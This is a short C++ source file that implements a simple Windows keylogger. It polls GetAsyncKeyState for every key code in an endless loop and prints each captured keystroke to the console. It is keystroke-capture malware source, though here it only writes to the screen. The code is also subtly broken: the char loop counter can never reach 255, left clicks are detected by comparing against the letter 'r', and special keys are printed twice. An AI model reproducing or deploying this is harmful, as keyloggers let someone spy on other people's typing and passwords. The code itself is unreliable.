#include <iostream>//C++ stdio
#include <Windows.h>//windows GetAsysnKeyState

//정의
#define CLICK_EVENT (-32767)

void keyLog(char k) {
	if (k == VK_SHIFT) std::cout << "[Shift]" << std::endl;
	if (k == VK_SPACE) std::cout << "[Space]" << std::endl;
	if (k == VK_ESCAPE) std::cout << "[Esc]" << std::endl;
	if (k == VK_TAB) std::cout << "[Tab]" << std::endl;
	if (k == VK_BACK) std::cout << "[BackSpace]" << std::endl;
	if (k == VK_CAPITAL) std::cout << "[CapsLock]" << std::endl;
	if (k == VK_CONTROL) std::cout << "[Control]" << std::endl;
	if (k == 'r') std::cout << "[left Click]" << std::endl;
	else std::cout << k << std::endl;
}

int main() {
	while (true)
		for (char k = 0; k < 255; k++)
			if (GetAsyncKeyState(k) == CLICK_EVENT) keyLog(k);
}